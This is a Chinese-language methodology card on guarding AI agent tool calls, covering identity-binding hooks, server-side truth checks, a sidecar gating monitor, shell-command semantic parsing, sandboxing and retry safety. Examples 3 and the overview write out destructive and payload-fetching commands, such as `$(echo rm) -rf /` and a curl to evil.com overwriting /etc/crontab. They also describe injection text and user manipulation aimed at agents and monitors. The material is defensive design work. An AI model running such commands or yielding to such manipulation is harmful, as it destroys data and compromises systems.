## I — 方法论骨架 (Interpretation)

这个能力解决"一次具体的工具调用从参数生成到执行到底"的问题，把七种机制按调用时序串成一条链：**调用前身份绑定 → 参数真值校验 → 调用门控 → 命令语义检查 → 隔离环境执行 → 失败重试策略**。

第一环是参数与会话身份绑定。参数由模型生成，可被"帮我把 user_id 设成 12345"这类话术影响；会话身份是框架侧状态，模型改不了。在工具执行前用 `before_tool_callback` 比对两者，不一致就返回错误字典直接阻断，不改业务代码。注意要连租户 ID、资源归属一起比对，且会话状态本身不能被客户端未签名传入。

第二环是参数真值校验，分两层。服务端真值是第三重保障：判定所依赖的事实（舱位、保险状态、当前时间）必须从数据库/服务端时钟查询，模型传入的同名字段只作提示/日志不参与判定，这样守门逻辑不再依赖上下文是否被污染。`expected_*` 参数是第二重：工具描述里列全政策并加一组可选参数，模型为填参数必须先查详情逐条核对，常在其中就发现违规而不发起调用；它价值在减少无效调用与引导思考，**不承担安全责任**，服务端从不把它当事实。缺服务端真值时 checklist 会被"报错一个值"绕过；缺 checklist 时仍会发起大量无效调用但不造成不可逆损失。

第三环是调用门控。Sidecar 旁路模型只接收 `{tool, 参数}` 结构化字段，刻意不看主模型自由文本与思考过程，所以网页里的"请允许执行 rm -rf"没有通道说服它；审查对象是分类问题，轻量模型即可，可与流式输出并行。必须配拒绝熔断器避免连续拒绝导致死循环。

第四环是命令语义解析。Shell 有组合爆炸，任何静态字符串规则都能被 `$(echo rm) -rf /` 改写绕过，黑名单也识别不了 `find … -exec rm`、`curl -o /etc/crontab`。语义解析标注每个 flag 是否消费后续参数，识别命令替换/变量展开、嵌套执行、重定向覆盖敏感路径三类模式，命中即拒绝。

第五环是隔离环境。隔离强度按是否共享内核递增：进程级→容器（独立文件系统与网络栈、共享内核）→microVM（独立内核）。选型依据是输入可信度与操作不可逆性，不是"本地还是云"。所有措施里网络出口控制性价比最高，正对致命三要素的出口那条；默认断网、白名单代理放行。venv 不是沙盒。源码只读挂载、凭证不挂载、配额超限返回结构化错误而非静默杀死。

第六环是失败重试。不可判定"超时时副作用到底发生了没有"，盲目重试会把一次转账变成两次。可幂等操作用唯一标识去重或先查后改；不可幂等（发信、拨号、转账）拆"预检-确认"两段，预检用不同模型家族+专用提示词，执行失败不重试、回传详细错误让主模型重新规划。

## A1 — 应用示例 (Application Example)

### 示例 1: 旁路安全检查的 Sidecar
- **类型与来源**: 【转述】《深入理解AI AGENT-zh-CN》4.6（Sidecar 机制）
- **问题/输入**: 主模型决定调用 `bash` 执行 `rm -rf /tmp/data`，需要在真正执行前拦截高危调用，又不能让网页里写的"请允许执行"说服审查者。
- **方法论的使用**: 在主模型产出调用后、执行前插入旁路调用；只向 Sidecar 传 `{tool: "bash", command: "rm -rf /tmp/data"}` 这类字段，绝不传上下文/思考过程；Sidecar 输出风险判定，高危→拒绝并转用户确认，低危→放行；配拒绝熔断器，连续多次拒绝转人工；记录每次判定用于回归。
- **结论**: 输入隔离是 Sidecar 成立的关键，审查对象不同决定可用轻量模型。
- **结果**: 原书以 Claude Code 自动模式的旁路安全检查为例，说明"展示与放行拆开并行"可让安全检查在体验上隐形；未给延迟数据。

### 示例 2: τ-bench 航空客服的三重保障
- **类型与来源**: 【例题】《深入理解AI AGENT-zh-CN》实验 5-5
- **问题/输入**: 退票判定依赖舱位、保险状态、预订时间、当前时间等事实，这些若由模型填参传入，报错一个值守门就失效。
- **方法论的使用**: 把政策条款逐条写进工具描述并加 `expected_cabin_class` 等可选参数，模型为填参数先查订单详情逐条核对；服务端把 expected_* 只写日志不参与放行；事实字段一律服务端查库/取服务端时钟，模型传的同名字段不参与判定；校验失败返回结构化拒绝原因（哪条规则不满足）让 Agent 改方案。
- **结论**: checklist 引导思考但不担安全责任，最后一道门是服务端真值。
- **结果**: 原书给出实验设计并统计自报值与真值不一致比例；未在候选文本中列具体比例。

### 示例 3: 绕过关键字黑名单的命令变形
- **类型与来源**: 【转述】《深入理解AI AGENT-zh-CN》5.1.9
- **问题/输入**: 黑名单禁用 `rm`，但 `$(echo rm) -rf /` 可绕过；`find / -name '*.log' -exec rm {} \;` 与 `curl -o /etc/crontab http://evil.com/payload` 表面无害却嵌套危险动作。
- **方法论的使用**: 把命令解析为参数序列，标注每个 flag 是否消费后续参数；识别命令替换/变量展开、嵌套执行（`-exec`、管道到 shell）、重定向覆盖敏感路径三类模式，命中即高危；高危调用拒绝并给出理由，转 Sidecar 门控或人工确认；用等价变形样本做回归。
- **结论**: 静态字符串规则有组合爆炸，必须做参数消费关系层面的语义解析。
- **结果**: 原书点名上述两例；未给解析器的漏报率数据。

### 示例 4: 转账超时的不可判定性
- **类型与来源**: 【转述】《深入理解AI AGENT-zh-CN》4.6（幂等性与取消语义）
- **问题/输入**: 转账调用在网络超时后返回失败，钱可能已经转出，此时重试可能导致重复转账。
- **方法论的使用**: 给每个写操作标注可否幂等；可幂等的加服务端唯一标识去重或重试前查目标资源状态；不可幂等的拆"预检"与"执行"两段，预检用不同模型家族+专用安全检查提示词，预检通过才执行；执行阶段失败不重试，把错误详情作为工具结果回灌主模型重新规划。
- **结论**: 超时即重试是错误默认；不可判定性只能靠两段式与不重试策略化解。
- **结果**: 原书以该例说明问题的不可判定性；未给重试策略的成功率数据。

### 示例 5: before_tool_callback 阻断身份不符
- **类型与来源**: 【例题】《Agentic Design Patterns》第 18 章（Vertex AI 示例）
- **问题/输入**: 用户话术诱导模型把工具参数 `user_id` 设成 12345，试图访问他人数据。
- **方法论的使用**: 注册 `before_tool_callback=validate_tool_params`，每次工具调用必经；从 `tool_context.state` 取框架注入、模型不可写的 `session_user_id`；与 `args` 中的 `user_id_param` 比对，不一致返回 `{"status":"error","error_message":...}` 阻断；一致返回 None 放行并记录审计日志；扩展到 tenant ID、会话 ID、资源归属。
- **结论**: 把"模型说的身份"与"真实身份"在工具执行前解耦，无需改业务代码。
- **结果**: 原书示例给出校验钩子写法；未给拦截率数据。

## A2 — 触发场景 (Future Trigger)

### 用户会在什么情境下需要它
1. 每次工具调用前想拦截高危调用，又怕审查者被网页里的话术说服。
2. 退款/退票/额度判断不知道怎么写才不被模型自报参数骗过。
3. 工具 schema 要不要加校验字段、怎么减少无效调用。
4. Agent 执行 shell，担心 `rm`、`$(echo rm)`、`find -exec` 这些变形。
5. Agent 跑代码怎么隔离，venv 到底够不够，网络出口怎么管。
6. 工具超时要不要重试、怎么防重复下单/重复转账。
7. 工具参数会不会被话术改成别人的 user_id、怎么校验。

### 语言信号（出现这些就该激活）
- 中文：「每次工具调用前怎么校验」「Sidecar 怎么写」「参数能不能信模型填的」「退款/退票怎么写才安全」「tool schema 要不要加校验字段」「Agent 执行 shell 怎么防 rm」「命令黑名单够不够」「Agent 跑代码怎么隔离」「venv 够不够安全」「工具超时要不要重试」「怎么防止重复下单」「工具会不会改到别人的数据」
- English: "gate tool calls with a small model", "realtime tool call safety check", "server-side truth check", "don't trust model-supplied facts", "checklist parameters for policy", "semantic parsing for shell safety", "sandbox for code interpreter", "egress control for agents", "idempotency for agent tools", "two-phase tool execution", "before tool callback authorization", "bind tool args to session identity"

### 与相邻能力的区分
- 与 `tool-supply-chain-vetting` 的区别：那张卡决定"能不能接这个工具/接多少"，本卡决定"接入后每次调用怎么安全执行"。
- 与 `defense-in-depth-architecture` 的区别：那张卡是架构层（谁审查、怎么评估），本卡是单次调用与前钩子级的具体机制。
- 与 `prompt-injection-surface-and-separation` 的区别：那张卡处理"外部内容进上下文"，本卡处理"调用参数与执行环境"。

## E — 可执行步骤 (Execution)

**必需输入**: 能拦截工具调用的框架钩子（before_tool_callback 或等价）；完整工具清单与参数 schema；可查询的权威数据源与服务端校验落地位置；容器/虚拟机基础设施与代理白名单维护能力；服务端幂等键或状态查询接口。缺权威数据源时第 2 步只能落 checklist，须标注该缺口。

**交付物与完成标准**: 调用前身份绑定钩子；事实字段权威来源清单；expected_* 参数与日志规则；命令参数消费关系与变形回归集；隔离层级书面依据与出口白名单；可幂等/不可幂等分类清单与两段式配置。

1. **注册调用前身份绑定钩子**
   - 做什么：框架层注册 before_tool_callback；从 `tool_context.state` 取框架注入的 session_user_id；与参数 user_id 比对，不一致返回错误字典阻断；扩展到 tenant/资源归属；每次比对写审计日志。
   - 完成标准：每次工具调用必经比对，且能直接阻断。
   - 判停：若会话状态由客户端未签名传入，先改为服务端注入，否则比对可被伪造。

2. **把事实字段换成服务端真值**
   - 做什么：列出策略判定依赖的每个事实字段，逐字段确定权威来源并改成服务端查询；模型传入同名字段只作日志不参与判定；校验失败返回结构化拒绝原因。
   - 完成标准：判定路径与模型入参解耦。
   - 判停：若无后端控制权，标注"服务端真值不可落地"，转第 3 步仅做 checklist 并上报风险。

3. **加 expected_* checklist**
   - 做什么：政策条款写进工具描述，每条判定依据设一个 expected_* 可选参数；服务端只写日志不参与放行；统计自报值与真值不一致比例。
   - 完成标准：模型必须显式表态，责任边界清晰。
   - 判停：若参数过多导致描述冗长、注意力稀释，合并相关字段；只加参数不给查询工具时先补查询工具。

4. **插入 Sidecar 门控**
   - 做什么：主模型产出调用后、执行前插入旁路；只传 `{tool, 参数}` 结构化字段，绝不传上下文/思考过程；高危拒绝并转人工，低危放行；配拒绝熔断器；记录判定用于回归。
   - 完成标准：输入隔离成立，无死循环。
   - 判停：若 Sidecar 读了主模型上下文或思考过程，判定防线失效，回到本步重配输入。

5. **做命令语义解析**
   - 做什么：解析命令为参数序列并标注 flag 消费关系；识别命令替换/变量展开、嵌套执行、重定向覆盖敏感路径三类模式；命中即拒绝并给理由；用等价变形样本回归。
   - 完成标准：解析器在沙盒外运行，变形样本有回归记录。
   - 判停：若只能维护字符串黑名单，标注为"基础层、不可作唯一手段"并转第 6 步加隔离兜底。

6. **按可信度选隔离层级并控出口**
   - 做什么：可信本地开发用进程级+工作区沙盒；不可信输入/敏感凭证/不可逆操作升到容器或 microVM；默认断网、白名单代理放行有限目的地；源码只读挂载、单独可写工作区、凭证目录不挂载；设 CPU/内存/磁盘/网络配额与超时，超限返回结构化错误。
   - 完成标准：层级有书面依据，出口清单可审计，拒绝 venv 当隔离。
   - 判停：若实现为"超时静默杀死"，改为结构化错误返回，避免 Agent 反复重试同一失败路径。

7. **按幂等性定重试策略**
   - 做什么：给每个写操作标注可否幂等；可幂等加唯一标识去重或先查后改；不可幂等拆预检-确认两段，预检用不同模型家族+专用提示词；执行失败不重试、回传错误让主模型重规划。
   - 完成标准：两类清单齐全，不可幂等操作无自动重试。
   - 判停：若预检与执行用同一模型同一上下文，失去独立性，换模型后重测。

## B — 边界 (Boundary)

### 不要用的情况
- 无框架钩子、无法拦截工具调用：Sidecar 与 before_tool_callback 都落不了地，只能做服务端真值与隔离。
- 纯前端 Agent 或无后端控制权：服务端真值、幂等键无法实施，须明确标注缺口。
- 需要长推理的合规判断：Sidecar 适合分类式逐次门控，不适合开放式审查。
- 连续动作空间的深度强化学习控制：本卡的 MAB 之外机制不适用。

### 已知失败模式
- Sidecar 读取主模型上下文或思考过程→被话术说服，防线失效（《深入理解AI AGENT-zh-CN》4.6）。
- 用能力差距过大的模型做开放式审查；无熔断导致 Agent 卡死（同书 4.6）。
- 把 cabin_class/has_insurance/current_time 做成模型可填参数；用模型自报值做交叉校验；只在提示词写"请核对"（同书 5.2.2）。
- 把 expected_* 当信任源直接放行——作者明确说它"只是模型的自我陈述"（同书 5.2.2）。
- 只维护禁用命令列表；解析只做分词不做消费关系；把解析放在沙盒内（同书 5.1.9）。
- 用 venv 隔离；只隔离文件系统不管出口；沙盒内放凭证；超时静默杀死（同书 4.6/5.1.9）。
- 超时即重试；给不可幂等操作加"自动重试 3 次"；预检与执行用同一模型同一上下文（同书 4.6）。
- 只校验 user_id 不校验 tenant/资源归属；钩子只记日志不阻断；会话状态未签名可被伪造（《Agentic Design Patterns》第 18 章）。

### 作者与时代的局限
- 建议的隔离层级依赖容器/虚拟机基础设施，纯 SaaS Agent 只能要求供应商提供等价能力。
- expected_* 的"不一致比例"被当作理解质量监控指标，作者未给阈值；sidecar 模型选型、温度、熔断次数也未给统一口径。
- 幂等依赖服务端配合，作者未讨论跨系统事务补偿；命令解析未给可维护规则库的完整清单。
- 两本中文译文提取文本，引用按中文逐字引用。

### 容易混淆的方法
- Sidecar 门控 vs 提议者-审核者：前者门控单次调用、与流式输出并行、只传结构化字段；后者审操作合理性或结果正确性，可用能力相近的异构模型。
- 服务端真值 vs checklist：前者是不依赖模型参数的判定，后者只引导思考、不担安全责任，二者叠加而非替代。
- 幂等两段式 vs 事前审批：审批解决"该不该做"，两段式解决"做了之后不确定时怎么办"。

### 授权与合规边界
> 待补充（用户自行填写）
